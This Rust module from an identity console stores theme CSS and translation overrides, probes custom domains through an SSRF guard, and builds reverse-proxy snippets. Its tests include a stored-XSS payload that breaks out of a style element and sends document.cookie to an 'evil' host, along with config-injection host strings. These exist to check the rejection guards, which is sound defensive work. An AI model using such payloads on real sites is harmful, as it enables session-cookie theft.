//! Console-owned Account Experience (AX) override-file store (AX-02 / AX-03).
//!
//! This module persists the operator-authored THEMING (CSS-variable override)
//! and LOCALIZATION (`customTranslations` JSON catalog) override files the
//! self-hosted Account Experience service reads at boot. It is a `[CUSTOM]`
//! concern in the exact mould of `branding/mod.rs`: it makes **NO Ory call**,
//! it never touches any service YAML (kratos.yml etc.), and it is **NOT** the
//! `{service}/{section}` config-edit allowlist engine. It writes a console-owned
//! FILE to a SERVER-DEFINED canonical path on the mounted config volume — the
//! AX consumes those files read-only (see `account-experience/`).
//!
//! ## Hardening (STRIDE register, 15-02 PLAN)
//!
//! - **T-15-06 path injection:** the destinations are SERVER-DEFINED canonical
//!   paths `{config_dir}/account-experience/theme.css` and `/translations.json`
//!   ([`theme_path`] / [`translations_path`]). The client NEVER supplies a path
//!   component — there is no traversal surface (mirrors `branding::logo_path`).
//! - **T-15-08 malformed-JSON corrupts AX boot:** the localization writer
//!   JSON-parses the body and REJECTS malformed input with 422 BEFORE any disk
//!   touch (mirrors the OPL "no write on invalid" discipline). The stored form
//!   is canonical pretty JSON. The AX additionally falls back to `{}` on a parse
//!   failure at read time (belt-and-braces).
//! - **T-15-10 info disclosure:** every error is a value-free [`AppError`] — no
//!   filesystem path is ever echoed (mirrors `put_smtp_connection` /
//!   `branding`).
//!
//! The GET/PUT handlers (in [`routes`]) sit on the Phase-2 PROTECTED subtree and
//! are additionally gated by `FeatureFlagHoop::new("account_experience")` so a
//! flag-OFF request 404s even past a valid session + matching CSRF token
//! (FLAG-01 / T-15-07). PUT is state-changing (csrf_guard 403); GET is
//! csrf-exempt; both inherit auth_guard (401).

pub mod routes;

use std::path::{Path, PathBuf};

use crate::config_edit::yaml::write_atomic;
use crate::error::AppError;

/// The ONLY two AX override files this module ever widens to world-readable. The
/// contract is enforced by file NAME (the basename must be one of these) so the
/// world-read widener can NEVER be pointed at a future/secret override file (WR-04).
const NON_SECRET_WORLD_READABLE_FILES: [&str; 2] = ["theme.css", "translations.json"];

/// Relax a KNOWN NON-SECRET AX override file to WORLD-READABLE (`0644`) after the
/// atomic write.
///
/// CROSS-SERVICE READ CONTRACT (correctness fix): the backend runs as a distroless
/// `nonroot` uid (65532) and `write_atomic` persists via `NamedTempFile`, whose
/// secure default mode is `0600` (owner-only) — correct for SECRET service config
/// (kratos.yml/SMTP/etc.). But these two AX files are NON-secret (theme CSS,
/// translations JSON) and are CONSUMED at boot by the account-experience container,
/// which runs as a DIFFERENT uid (`node`, 1000). A `0600` file owned by 65532 is
/// unreadable by uid 1000 → the AX read fails `EACCES` and silently falls back to
/// "no override" (the AX-02/AX-03 override would never apply). So for THESE files
/// only we widen to `0644` (owner-write, world-read). They carry no secret, so
/// world-read is safe and intended. The dir itself is created `0755` by
/// `create_dir_all` under the standard umask, so it is already traversable.
///
/// WR-04 (contract hardening): this helper is NO LONGER a generic "world-readable"
/// widener. It REFUSES to widen any path whose basename is not in
/// [`NON_SECRET_WORLD_READABLE_FILES`] — so it is structurally impossible to
/// world-read a future/secret override file by routing it through the same
/// `write_*` path. A refusal is logged loudly and the file is LEFT at its secure
/// `0600` (fail-closed: a secret stays owner-only). The two callers below pass the
/// server-defined canonical theme/translations paths, so the legitimate widen
/// always proceeds.
///
/// Unix-only mode bits; a no-op elsewhere (the deployment target is Linux
/// containers). Best-effort on the legitimate path: a chmod failure is logged, not
/// fatal (the write already succeeded; the operator can re-trigger).
fn make_world_readable(path: &Path) {
    // WR-04: gate on the basename — refuse anything not on the non-secret allowlist.
    let is_allowlisted = path
        .file_name()
        .and_then(|n| n.to_str())
        .map(|n| NON_SECRET_WORLD_READABLE_FILES.contains(&n))
        .unwrap_or(false);
    if !is_allowlisted {
        tracing::error!(path = %path.display(),
            "account-experience: REFUSING to world-read a non-allowlisted override file \
             (WR-04 NON-SECRET-ONLY contract) — left at 0600");
        return;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Err(e) = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o644)) {
            tracing::warn!(error = %e, path = %path.display(),
                "account-experience: could not relax override file to 0644 (AX may not read it)");
        }
    }
    #[cfg(not(unix))]
    {
        let _ = path;
    }
}

/// The server-defined directory that holds the AX override files:
/// `{config_dir}/account-experience`. Lives on the mounted config volume the AX
/// reads read-only.
pub fn ax_config_dir(config_dir: &str) -> PathBuf {
    PathBuf::from(config_dir).join("account-experience")
}

/// SERVER-DEFINED canonical path for the theming CSS-variable override file:
/// `{config_dir}/account-experience/theme.css`. The client never supplies any
/// path component (T-15-06).
pub fn theme_path(config_dir: &str) -> PathBuf {
    ax_config_dir(config_dir).join("theme.css")
}

/// SERVER-DEFINED canonical path for the localization `customTranslations`
/// catalog: `{config_dir}/account-experience/translations.json`. The client
/// never supplies any path component (T-15-06).
pub fn translations_path(config_dir: &str) -> PathBuf {
    ax_config_dir(config_dir).join("translations.json")
}

/// Read the current theming override SOURCE text. Returns the empty string when
/// no file has been written yet (so the AX uses the default theme / the editor
/// opens blank). A non-UTF-8 or unreadable file surfaces a value-free error.
pub fn read_theme(config_dir: &str) -> Result<String, AppError> {
    let path = theme_path(config_dir);
    match std::fs::read(&path) {
        Ok(bytes) => String::from_utf8(bytes).map_err(|_| {
            // The stored theme override is always written as UTF-8 text by this
            // module; a non-UTF-8 file is a corrupted/foreign write.
            AppError::Internal("account-experience theme override is not valid UTF-8".into())
        }),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(String::new()),
        Err(e) => {
            tracing::error!(error = %e, "account-experience: failed to read theme override");
            Err(AppError::Internal("account-experience theme read failed".into()))
        }
    }
}

/// Read the current localization `customTranslations` JSON. Returns the empty
/// object `{}` when no file has been written yet. The stored file is always
/// canonical JSON written by [`write_translations`]; a corrupt file surfaces a
/// value-free error.
pub fn read_translations(config_dir: &str) -> Result<serde_json::Value, AppError> {
    let path = translations_path(config_dir);
    match std::fs::read(&path) {
        Ok(bytes) => {
            let text = String::from_utf8(bytes).map_err(|_| {
                AppError::Internal(
                    "account-experience translations override is not valid UTF-8".into(),
                )
            })?;
            if text.trim().is_empty() {
                return Ok(serde_json::json!({}));
            }
            serde_json::from_str(&text).map_err(|_| {
                AppError::Internal(
                    "account-experience translations override is not valid JSON".into(),
                )
            })
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(serde_json::json!({})),
        Err(e) => {
            tracing::error!(error = %e, "account-experience: failed to read translations override");
            Err(AppError::Internal(
                "account-experience translations read failed".into(),
            ))
        }
    }
}

/// Validate that `source` is plausible THEMING override TEXT (not binary) AND
/// cannot break out of the `<style>` element the AX injects it into (CR-01,
/// stored-XSS write-side guard — LAYER 1 of the defense-in-depth).
///
/// The AX consumes this verbatim inside a `<style id="ax-theme-override">` via
/// `dangerouslySetInnerHTML`. The HTML tokenizer treats `<style>` as a RAW-TEXT
/// element: it does NOT CSS-parse the body, it ends the element at the first
/// literal `</style` (case-insensitive) and will start parsing markup after it.
/// A stored override of `:root{}</style><script>…</script>` therefore breaks out
/// of the style block and injects an executable `<script>` onto the UNAUTHENTICATED
/// end-user login origin (where the Kratos session/CSRF cookies live).
///
/// Legitimate CSS NEVER needs a literal `<`: CSS selectors, at-rules, custom
/// properties and values have no `<` token. So we reject ANY `<` outright — this
/// makes `</style>`, `<script`, `<!--`, and every other markup-injection vector
/// structurally impossible to STORE. NUL bytes (a binary-blob marker) are also
/// rejected. The error is value-free (T-15-10): it never echoes the rejected text.
fn validate_theme_text(source: &str) -> Result<(), AppError> {
    if source.contains('\0') {
        return Err(AppError::BadRequest(
            "theme override must be plain text (CSS), not binary".into(),
        ));
    }
    // CR-01 (stored-XSS, write-side): reject ANY '<'. Real CSS has no '<' token,
    // so this can never reject a legitimate theme — but it makes a `</style>`
    // (or `<script`, `<!--`, etc.) breakout impossible to persist. This is the
    // authoritative guard; the AX sink ALSO defangs `<` as a second layer.
    if source.contains('<') {
        return Err(AppError::BadRequest(
            "theme override must be CSS only and cannot contain '<' (no HTML/markup)".into(),
        ));
    }
    Ok(())
}

/// Atomically write the THEMING override file with the given raw CSS-variable
/// source. The destination is the SERVER-DEFINED canonical path (T-15-06);
/// the parent dir is created if absent. The source is stored verbatim.
pub fn write_theme(config_dir: &str, source: &str) -> Result<(), AppError> {
    validate_theme_text(source)?;
    let dir = ax_config_dir(config_dir);
    std::fs::create_dir_all(&dir).map_err(|e| {
        tracing::error!(error = %e, "account-experience: failed to create config dir");
        AppError::Internal("account-experience write failed".into())
    })?;
    let path = theme_path(config_dir);
    write_atomic(&path, source)?;
    // Cross-service read contract: the AX (uid 1000) must read this file the
    // backend (uid 65532) just wrote 0600. Widen to 0644 (non-secret CSS).
    make_world_readable(&path);
    Ok(())
}

/// Parse `body` as JSON, REJECTING malformed input with 422 BEFORE any disk
/// touch (T-15-08), then atomically write the canonical pretty JSON to the
/// SERVER-DEFINED `translations.json` path (T-15-06). The parsed value is
/// returned so the caller can echo the canonical stored form. A non-object
/// top-level JSON (e.g. a bare array/string) is rejected — `customTranslations`
/// is a `Partial<LocaleMap>` object (A6).
pub fn write_translations(config_dir: &str, body: &str) -> Result<serde_json::Value, AppError> {
    // T-15-08: parse FIRST. A malformed body is a 422 with NO disk write.
    let value: serde_json::Value = serde_json::from_str(body).map_err(|_| {
        AppError::Validation(vec![crate::config_edit::schema::FieldError {
            path: "/".to_string(),
            message: "translations override must be valid JSON".to_string(),
        }])
    })?;
    if !value.is_object() {
        return Err(AppError::Validation(vec![
            crate::config_edit::schema::FieldError {
                path: "/".to_string(),
                message: "translations override must be a JSON object (a locale → strings map)"
                    .to_string(),
            },
        ]));
    }

    // Canonical pretty JSON is what we persist (deterministic round-trip).
    let pretty = serde_json::to_string_pretty(&value).map_err(|e| {
        tracing::error!(error = %e, "account-experience: failed to serialize translations");
        AppError::Internal("account-experience write failed".into())
    })?;

    let dir = ax_config_dir(config_dir);
    std::fs::create_dir_all(&dir).map_err(|e| {
        tracing::error!(error = %e, "account-experience: failed to create config dir");
        AppError::Internal("account-experience write failed".into())
    })?;
    let path = translations_path(config_dir);
    write_atomic(&path, &pretty)?;
    // Cross-service read contract: the AX (uid 1000) must read this file the
    // backend (uid 65532) just wrote 0600. Widen to 0644 (non-secret JSON).
    make_world_readable(&path);
    Ok(value)
}

// ─── AX-04 (Custom Domains): reachability check + reverse-proxy snippet ─────────
//
// These two helpers back the Custom Domains editor. NEITHER provisions TLS/DNS —
// the operator's reverse proxy owns that (the snippet is GUIDANCE only). The
// reachability check is the highest-risk surface: an operator-supplied URL is an
// SSRF vector into the internal admin ports (T-15-11 / Pitfall 7), so it MUST
// route through the HOOK-02 guard (`webhooks::ssrf::validate_url` + the pinned,
// redirects-off client) BEFORE any fetch. A guard rejection is an EXPLICIT error
// (mapped to 4xx upstream), never collapsed into a `reachable:false` success
// (anti-false-green, T-15-15).

/// The outcome of an AX-04 reachability probe of an operator-supplied URL.
///
/// WR-02 (outbound-oracle reduction): this is a COARSE boolean result, NOT a
/// status echo. The earlier shape returned `status: Some(resp.status())` for any
/// public host that passed the SSRF guard, turning the console into a generic
/// "fetch any public URL and report its exact HTTP status" probe for an
/// authenticated operator. The custom-domain UI only needs "is my domain
/// serving?", so we collapse the response to `{reachable, reason}` where `reason`
/// is a fixed enum bucket — never the raw upstream status code or any header.
#[derive(Debug, serde::Serialize)]
pub struct Reachability {
    /// True iff the guarded GET returned ANY HTTP response (the host answered).
    /// A transport failure (no answer) is `false`.
    pub reachable: bool,
    /// A FIXED, coarse classification — NOT the upstream status code. One of:
    /// `"ok"` (2xx/3xx answered), `"http_error"` (4xx/5xx answered),
    /// `"unreachable"` (transport failure / no answer). This avoids leaking the
    /// exact status of an arbitrary public endpoint while still telling the
    /// operator whether their domain is up and serving successfully (WR-02).
    pub reason: &'static str,
}

/// Run an SSRF-guarded reachability probe of `url`.
///
/// The HOOK-02 guard runs FIRST: a private/loopback/link-local/metadata/
/// credentialed/non-http(s) target is REJECTED here (returns the guard's
/// `AppError`, which maps to 4xx — NEVER a `reachable:false` 200). Only a target
/// that passes the guard is fetched, and the fetch uses the pinned, redirects-off
/// client built by `build_pinned_client` (TOCTOU + no-3xx-bounce defense). A
/// transport failure AFTER the guard passed (e.g. a public host that does not
/// answer) is a legitimate `reachable:false` — NOT an SSRF rejection.
pub async fn check_reachability(url: &str) -> Result<Reachability, AppError> {
    // Gate 1 (anti-false-green): the SSRF guard. An internal/loopback/credentialed
    // target is refused HERE and propagates as a 4xx — never a reachable:false.
    crate::webhooks::ssrf::validate_url(url).await?;

    // Gate 2: build the pinned, redirects-off client (re-resolves + re-validates
    // every IP — DNS-rebind defense). Production posture: allow_private=false.
    let (client, _addrs) = crate::webhooks::ssrf::build_pinned_client(url, false).await?;

    // The single guarded GET. A transport error (connection refused/timeout to a
    // PUBLIC host that passed the guard) is a legitimate unreachable result.
    //
    // WR-02: classify into a COARSE bucket — never echo the raw upstream status.
    // 2xx/3xx -> "ok"; 4xx/5xx -> "http_error" (the host answered, but not a
    // success); transport failure -> "unreachable".
    match client.get(url).send().await {
        Ok(resp) => {
            let reason = if resp.status().is_success() || resp.status().is_redirection() {
                "ok"
            } else {
                "http_error"
            };
            Ok(Reachability {
                reachable: true,
                reason,
            })
        }
        Err(_) => Ok(Reachability {
            reachable: false,
            reason: "unreachable",
        }),
    }
}

/// Generate a reverse-proxy GUIDANCE snippet (nginx + Caddy + Traefik examples)
/// mapping the operator's AX origin `host` to the Account Experience service and
/// the Kratos public path. PURE STRING OUTPUT — no fetch, no file write, no
/// TLS/DNS provisioning (the operator's proxy owns certificates + DNS).
///
/// `host` is the operator-entered custom domain (e.g. `accounts.example.com`). It
/// is sanitised to a bare host token (no scheme/path/whitespace) before being
/// interpolated, so a malicious value cannot inject extra config directives.
pub fn reverse_proxy_snippet(host: &str) -> String {
    let host = sanitize_proxy_host(host);
    format!(
        "# Reverse-proxy guidance for the Account Experience custom domain.\n\
         # TLS and DNS are owned by YOUR reverse proxy — this console does NOT\n\
         # provision certificates or DNS records. Point {host} at your proxy,\n\
         # terminate TLS there, and forward to the Account Experience service\n\
         # (and Kratos public path) as shown below.\n\
         #\n\
         # --- nginx ---\n\
         server {{\n\
         \x20   listen 443 ssl;\n\
         \x20   server_name {host};\n\
         \x20   # ssl_certificate / ssl_certificate_key managed by your proxy\n\
         \x20   location / {{\n\
         \x20       proxy_pass http://account-experience:3000;\n\
         \x20       proxy_set_header Host $host;\n\
         \x20       proxy_set_header X-Forwarded-Proto $scheme;\n\
         \x20   }}\n\
         \x20   location /.ory/kratos/public/ {{\n\
         \x20       proxy_pass http://kratos:4433/;\n\
         \x20       proxy_set_header Host $host;\n\
         \x20   }}\n\
         }}\n\
         \n\
         # --- Caddy ---\n\
         {host} {{\n\
         \x20   reverse_proxy /.ory/kratos/public/* kratos:4433\n\
         \x20   reverse_proxy account-experience:3000\n\
         }}\n\
         \n\
         # --- Traefik (dynamic config) ---\n\
         http:\n\
         \x20 routers:\n\
         \x20   ax:\n\
         \x20     rule: \"Host(`{host}`)\"\n\
         \x20     service: account-experience\n\
         \x20     tls: {{}}\n\
         \x20 services:\n\
         \x20   account-experience:\n\
         \x20     loadBalancer:\n\
         \x20       servers:\n\
         \x20         - url: \"http://account-experience:3000\"\n",
        host = host
    )
}

/// Reduce an operator-entered host to a bare host token: strip any scheme, path,
/// query, and surrounding whitespace, and keep only the authority's host portion.
/// Falls back to a safe placeholder when nothing host-like remains, so the
/// generated snippet never carries injected directives or empty interpolation.
fn sanitize_proxy_host(input: &str) -> String {
    let trimmed = input.trim();
    // If it parses as a URL, take the host. Otherwise treat the input as a host
    // and strip any stray scheme prefix / path suffix defensively.
    if let Ok(url) = url::Url::parse(trimmed) {
        if let Some(h) = url.host_str() {
            return h.to_string();
        }
    }
    let no_scheme = trimmed
        .rsplit("://")
        .next()
        .unwrap_or(trimmed);
    let host_only = no_scheme
        .split(['/', '?', '#', ' ', '\t', '\n', '\r'])
        .next()
        .unwrap_or("");
    if host_only.is_empty() {
        "your-domain.example".to_string()
    } else {
        host_only.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ─── server-defined canonical paths (T-15-06 traversal guard) ───

    #[test]
    fn override_paths_are_server_defined() {
        assert!(theme_path("/etc/config").ends_with("account-experience/theme.css"));
        assert!(
            translations_path("/etc/config").ends_with("account-experience/translations.json")
        );
        // No traversal component is ever present (the client supplies none).
        assert!(!theme_path("/etc/config").to_string_lossy().contains(".."));
        assert!(!translations_path("/etc/config")
            .to_string_lossy()
            .contains(".."));
    }

    // ─── theme: read/write round-trip + binary reject ───

    #[test]
    fn theme_round_trips_and_defaults_empty() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();

        // No file yet → empty source.
        assert_eq!(read_theme(&dir).unwrap(), "");

        // Write then re-read returns the written content verbatim.
        let css = ":root{--ui-brand:#0a0;--button-primary-bg:#0a0}";
        write_theme(&dir, css).unwrap();
        assert_eq!(read_theme(&dir).unwrap(), css);
    }

    #[test]
    fn theme_rejects_binary() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();
        let err = write_theme(&dir, "\u{0}binary").unwrap_err();
        assert!(matches!(err, AppError::BadRequest(_)), "got {err:?}");
        // No file was written (the dir is created but theme.css is absent).
        assert!(!theme_path(&dir).is_file());
    }

    // ─── CR-01: stored-XSS `</style>` breakout is rejected on write, NO disk write ───

    #[test]
    fn theme_rejects_style_breakout_xss_with_no_write() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();

        // Seed a known-good file first so we can prove it is UNCHANGED on reject.
        let good = ":root{--ui-brand:#0a0}";
        write_theme(&dir, good).unwrap();
        let before = std::fs::read_to_string(theme_path(&dir)).unwrap();

        // The canonical CR-01 breakout payload: end the <style> element and inject
        // an executable <script>. It contains '<', so the write-side guard rejects
        // it with a BadRequest (400) and performs NO disk write.
        let xss = r#":root{}</style><script>fetch('//evil/'+document.cookie)</script>"#;
        let err = write_theme(&dir, xss).unwrap_err();
        assert!(matches!(err, AppError::BadRequest(_)), "got {err:?}");
        // The prior good file is byte-for-byte untouched (CR-01: no write on reject).
        assert_eq!(
            std::fs::read_to_string(theme_path(&dir)).unwrap(),
            before,
            "a rejected XSS theme PUT must not touch the stored file (CR-01)"
        );

        // Any other markup vector with '<' is likewise rejected.
        for payload in ["<script", "<!--", "a{}</STYLE>", "/* */ <"] {
            let e = write_theme(&dir, payload).unwrap_err();
            assert!(matches!(e, AppError::BadRequest(_)), "payload {payload:?} -> {e:?}");
        }
    }

    #[test]
    fn theme_accepts_legitimate_css_variables() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();
        // Real CSS never needs a '<' token — the guard never false-rejects it.
        let css = ":root{--ui-brand:#0a0;--button-primary-bg:rgb(10 160 10)}\n\
                   @media (prefers-color-scheme: dark){:root{--ui-bg:#111}}";
        write_theme(&dir, css).unwrap();
        assert_eq!(read_theme(&dir).unwrap(), css);
    }

    // ─── translations: valid round-trip, malformed-no-write, non-object reject ───

    #[test]
    fn translations_round_trips_and_defaults_empty_object() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();

        // No file yet → {}.
        assert_eq!(read_translations(&dir).unwrap(), serde_json::json!({}));

        let body = r#"{"en":{"identities.messages.1040001":"Welcome"}}"#;
        let stored = write_translations(&dir, body).unwrap();
        assert_eq!(stored["en"]["identities.messages.1040001"], "Welcome");
        // Re-read returns the canonical stored value.
        assert_eq!(read_translations(&dir).unwrap(), stored);
    }

    #[test]
    fn translations_malformed_json_is_422_with_no_write() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();

        // Seed a known-good file first so we can prove it is UNCHANGED on reject.
        let good = r#"{"en":{"k":"v"}}"#;
        write_translations(&dir, good).unwrap();
        let before = std::fs::read_to_string(translations_path(&dir)).unwrap();

        // Malformed JSON → 422 Validation, NO disk write.
        let err = write_translations(&dir, "{ this is : not json ]").unwrap_err();
        assert!(matches!(err, AppError::Validation(_)), "got {err:?}");
        assert_eq!(
            std::fs::read_to_string(translations_path(&dir)).unwrap(),
            before,
            "the prior file must be untouched after a malformed-JSON reject (T-15-08)"
        );
    }

    #[test]
    fn translations_non_object_top_level_is_rejected() {
        let tmp = tempfile::tempdir().expect("temp config dir");
        let dir = tmp.path().to_string_lossy().to_string();
        // A bare array is valid JSON but not a LocaleMap object.
        let err = write_translations(&dir, "[1,2,3]").unwrap_err();
        assert!(matches!(err, AppError::Validation(_)), "got {err:?}");
        assert!(!translations_path(&dir).is_file());
    }

    // ─── WR-04: world-read widener is allowlist-scoped to the two non-secret files ───

    #[test]
    fn make_world_readable_only_widens_allowlisted_files() {
        let tmp = tempfile::tempdir().expect("temp config dir");

        // An allowlisted file (theme.css) IS widened (Unix: to 0644).
        let ok_path = tmp.path().join("theme.css");
        std::fs::write(&ok_path, "x").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&ok_path, std::fs::Permissions::from_mode(0o600)).unwrap();
        }
        make_world_readable(&ok_path);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&ok_path).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o644, "an allowlisted non-secret file must be widened to 0644");
        }

        // A NON-allowlisted file (a hypothetical future secret) is REFUSED — it
        // stays at its secure 0600 (fail-closed; WR-04 contract).
        let secret_path = tmp.path().join("secrets.json");
        std::fs::write(&secret_path, "shhh").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&secret_path, std::fs::Permissions::from_mode(0o600)).unwrap();
        }
        make_world_readable(&secret_path);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&secret_path).unwrap().permissions().mode() & 0o777;
            assert_eq!(
                mode, 0o600,
                "a non-allowlisted file must NOT be world-readable (WR-04 NON-SECRET-ONLY contract)"
            );
        }
    }

    // ─── AX-04: reverse-proxy snippet generation + host sanitization ───

    #[test]
    fn reverse_proxy_snippet_is_guidance_with_no_provisioning() {
        let snippet = reverse_proxy_snippet("accounts.example.com");
        // The operator host appears in each proxy example.
        assert!(snippet.contains("accounts.example.com"));
        // All three proxy flavours are present (guidance, not provisioning).
        assert!(snippet.contains("nginx"));
        assert!(snippet.contains("Caddy"));
        assert!(snippet.contains("Traefik"));
        // It explicitly states the operator owns TLS/DNS — NO provisioning.
        assert!(
            snippet.to_lowercase().contains("tls and dns are owned by your"),
            "snippet must state the operator owns TLS/DNS"
        );
        // It forwards to the AX service + Kratos public path.
        assert!(snippet.contains("account-experience:3000"));
        assert!(snippet.contains("kratos:4433"));
    }

    #[test]
    fn reverse_proxy_snippet_sanitizes_host() {
        // A full URL is reduced to its bare host (no scheme/path can inject).
        let s = reverse_proxy_snippet("https://accounts.example.com/path?x=1");
        assert!(s.contains("accounts.example.com"));
        assert!(!s.contains("/path"));
        assert!(!s.contains("x=1"));
        // A host carrying a stray path is reduced to the host token.
        let s2 = reverse_proxy_snippet("evil.example/}\ninjected");
        assert!(s2.contains("evil.example"));
        assert!(!s2.contains("injected"));
        // An empty host falls back to a safe placeholder (never empty interpolation).
        let s3 = reverse_proxy_snippet("   ");
        assert!(s3.contains("your-domain.example"));
    }

    #[test]
    fn sanitize_proxy_host_strips_scheme_and_path() {
        assert_eq!(sanitize_proxy_host("accounts.example.com"), "accounts.example.com");
        assert_eq!(
            sanitize_proxy_host("https://accounts.example.com/login"),
            "accounts.example.com"
        );
        assert_eq!(sanitize_proxy_host("foo.example/a/b"), "foo.example");
        assert_eq!(sanitize_proxy_host(""), "your-domain.example");
    }
}
